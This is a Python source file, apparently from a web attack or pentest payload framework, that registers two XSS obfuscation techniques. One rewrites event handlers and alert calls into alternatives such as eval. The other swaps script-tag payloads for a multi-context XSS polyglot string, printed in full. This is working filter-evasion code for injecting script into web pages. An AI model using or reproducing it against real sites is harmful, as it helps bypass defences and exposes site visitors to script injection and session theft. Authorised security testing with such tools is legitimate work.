# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""XSS obfuscation techniques (2 total)."""
from __future__ import annotations

import random

from hdwp.core.payloads.obfuscation.obfuscator_registry import ObfuscationTechnique


def _event_handlers(payload: str) -> str:
    """Remplace event handlers classiques par alternatives."""
    alternatives = {
        "onerror": ["onload", "onmouseover", "onfocus", "onblur", "onclick"],
        "alert": ["prompt", "confirm", "eval"],
    }
    result = payload
    for old, options in alternatives.items():
        if old in payload:
            result = result.replace(old, random.choice(options), 1)
    return result


def _polyglots(payload: str) -> str:
    """Transforme en polyglot XSS (HTML + JS + SQL)."""
    # Exemple polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
    if "<script>" in payload:
        return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
    return payload


# Liste exportée
XSS_OBFUSCATORS = [
    ObfuscationTechnique("xss_event_handlers", "xss", _event_handlers, "Event handlers alternatifs", complexity=1),
    ObfuscationTechnique("xss_polyglots", "xss", _polyglots, "Polyglot XSS multi-contexte", complexity=5),
]
